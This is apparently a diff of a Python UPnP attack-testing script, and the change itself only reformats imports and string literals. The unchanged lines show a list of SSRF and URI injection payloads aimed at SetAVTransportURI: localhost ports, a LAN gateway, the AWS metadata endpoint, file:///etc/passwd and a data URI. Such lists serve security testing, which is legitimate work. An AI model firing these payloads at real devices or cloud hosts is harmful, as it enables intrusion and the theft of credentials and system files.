@@ -4,8 +4,16 @@ Aggressive UPnP attack battery: EventSub hijack, header injection, service fuzzi
 connection exhaustion, metadata exfiltration, DIAL deep-scan.
 Author: Andre Henrique (@mrhenrike) | Uniao Geek
 """
-import os, tempfile, socket, time, json, datetime, re, threading
-import http.server, socketserver
+import os
+import tempfile
+import socket
+import time
+import json
+import datetime
+import re
+import threading
+import http.server
+import socketserver
 import requests
 
 _tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
@@ -211,15 +219,15 @@ def test_header_injection():
 
     # Test 3b: URI injection payloads via SetAVTransportURI
     uri_payloads = [
-        ("ssrf_localhost_80",    f"http://127.0.0.1:80/"),
-        ("ssrf_localhost_8080",  f"http://127.0.0.1:8080/"),
-        ("ssrf_localhost_22",    f"http://127.0.0.1:22/"),
-        ("ssrf_gateway",         f"http://192.168.18.1:80/"),
-        ("ssrf_169_254",         f"http://169.254.169.254/latest/meta-data/"),  # AWS metadata
-        ("path_traversal",       f"file:///etc/passwd"),
-        ("rtsp_scheme",          f"rtsp://192.168.18.1:554/"),
-        ("ftp_scheme",           f"ftp://192.168.18.1/"),
-        ("data_uri",             f"data:text/html,<h1>pwned</h1>"),
+        ("ssrf_localhost_80",    "http://127.0.0.1:80/"),
+        ("ssrf_localhost_8080",  "http://127.0.0.1:8080/"),
+        ("ssrf_localhost_22",    "http://127.0.0.1:22/"),
+        ("ssrf_gateway",         "http://192.168.18.1:80/"),
+        ("ssrf_169_254",         "http://169.254.169.254/latest/meta-data/"),  # AWS metadata
+        ("path_traversal",       "file:///etc/passwd"),
+        ("rtsp_scheme",          "rtsp://192.168.18.1:554/"),
+        ("ftp_scheme",           "ftp://192.168.18.1/"),
+        ("data_uri",             "data:text/html,<h1>pwned</h1>"),
     ]
     uri_results = {}
     for label, uri in uri_payloads:
